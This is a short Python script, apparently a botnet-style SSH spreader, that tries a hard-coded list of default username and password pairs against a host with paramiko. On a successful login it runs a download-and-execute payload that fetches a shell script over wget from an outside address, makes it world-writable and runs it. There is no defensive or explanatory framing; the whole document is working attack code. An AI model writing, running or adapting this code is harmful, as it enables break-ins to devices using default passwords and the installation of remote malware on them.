import paramiko

passwords = [
    "root:root",
    "admin:admin",
    "admin:1234",
    "guest:guest",
    "user:user",
]

payload = "cd /tmp; wget http://192.0.2.1/update.sh; chmod 777 update.sh; sh update.sh"

def try_host(ip):
    for pair in passwords:
        user, pw = pair.split(":")
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, port=22, username=user, password=pw, timeout=3)
            ssh.exec_command(payload)
            ssh.close()
            return True
        except Exception:
            continue
    return False
